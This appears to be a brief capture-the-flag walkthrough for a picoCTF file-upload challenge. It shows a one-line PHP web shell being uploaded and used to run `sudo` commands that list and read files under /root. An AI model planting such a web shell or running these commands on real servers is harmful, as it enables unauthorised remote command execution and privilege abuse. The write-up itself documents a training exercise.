uploaded a file, then enter the path of '/uploads/liu-kang.jpg' and it completely exposes the file -> huge security risk

Risk - *server is publicly exposing uploaded files*

on running curl -I \<site-name\>
`└─$ curl -I http://standard-pizzas.picoctf.net:60612/
`HTTP/1.1 200 OK
`Date: Tue, 22 Jul 2025 16:19:21 GMT
`Server: Apache/2.4.54 (Debian)
`X-Powered-By: PHP/7.4.33
`Content-Type: text/html; charset=UTF-8
`
PHP based site, so need a PHP payload to detect vulnerability or false command it follows
make a file `payload.php`
write in `<?php system($_GET['mycommand']); ?>`
to view contents of file just do `cat payload.php`

upload payload.php on site, go to its exposed location. Then in the mycommand space set it as uploads/payload.php?mycommand=sudo -l

in the question it says that flag is in root, so do sudo ls /root to reach flag
it is `flag.txt`

now to see contents of `flag.txt` just do `sudo cat /root/flag.txt`

We get the flag <3
